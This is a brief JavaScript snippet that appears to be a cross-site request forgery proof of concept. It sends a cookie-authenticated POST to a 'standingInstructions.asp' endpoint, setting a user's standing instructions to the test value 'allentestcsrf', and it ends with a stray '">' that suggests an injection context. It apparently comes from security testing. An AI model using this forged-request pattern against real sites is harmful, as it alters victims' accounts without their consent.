fetch('/users/standingInstructions.asp', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: '&uid=%7B3B7DE75F-1220-49E1-A73E-774D9F411125%7D' +
        '&oid=&typ=&USI_Instructions=allentestcsrf'
});
">
